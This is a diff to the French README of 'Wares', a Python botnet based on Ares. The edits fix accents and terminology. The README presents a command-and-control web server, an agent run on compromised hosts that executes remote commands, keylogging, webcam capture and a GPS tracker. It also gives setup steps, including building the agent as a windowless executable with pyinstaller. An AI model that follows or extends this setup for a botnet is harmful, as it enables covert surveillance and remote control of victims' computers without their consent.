@@ -1,11 +1,11 @@
 # Wares
-
+[](https://img.shields.io/badge/style-python-blue.svg?label=server)[](https://img.shields.io/badge/style-html-orange.svg?label=server)[](https://img.shields.io/badge/style-css-4B0082.svg?label=server)[](https://img.shields.io/badge/style-python-blue.svg?label=agent)[](https://img.shields.io/badge/style-arduino-ff69b4.svg?label=tracker)
 Wares, basé sur le projet [Ares](https://github.com/sweetsoftware/Ares), est un botnet codé en Python (version 2.7) sous le modèle d’une API RESTful.
 
-Wares est compose de trois programmes:
+Wares est composé de trois programmes:
 * Un **serveur Command aNd Control**, qui est une interface Web permettant d’administrer les agents
 * Un **programme agent**, qui est lancé sur l’hôte compromis, et assure la communication avec le CNC pour récupérer les commandes à exécuter, et retourner leurs résultats. Trois agents sont disponibles pour les différents OS : Windows, Unix (#TODO), OSX (#TODO)
-* Un **tracker GPS** fonctionnant sur Arduino, envoyant au CNC les données de géolocalisation récoltées
+* Un **traceur GPS** fonctionnant sur Arduino, envoyant au CNC les données de géolocalisation récoltées
 
 L’interface Web peut être lancée sur n’importe quel serveur exécutant Python. Mais elle nécessite d’installer le package python cherrypy.
 
@@ -17,7 +17,7 @@ Le client est un programme Python dépendant d’un certain nombre de librairies
 * keylogger
 * photo via webcam
 
-Le tracker GPS : TODO HowTo + code
+Le traceur GPS : TODO HowTo + code
 
 ## Installation
 
@@ -25,7 +25,7 @@ Le tracker GPS : TODO HowTo + code
 
 Pour commencer, il faut installer le package python **cherrypy**.
 
-Il faut ensuite créer la **base de données sqlite3**. Elle contiendra le mot de passe pour accéder à l’interface Web ainsi que toutes les données des agents (ID, OS, last online time, commandes, résultats, coordonnées gps [tracker]). Pour cela il suffit de lancer le script db_init.py :
+Il faut ensuite créer la **base de données sqlite3**. Elle contiendra le mot de passe pour accéder à l’interface Web ainsi que toutes les données des agents (ID, OS, last online time, commandes, résultats, coordonnées gps [traceur]). Pour cela il suffit de lancer le script db_init.py :
 ```
 cd server/
 
@@ -65,7 +65,7 @@ cd agent/python
 C:/path/to/pyinstaller --onefile --noconsole agent.py
 ```
 
-### Tracker
+### Traceur
 
 TODO HowTo
 
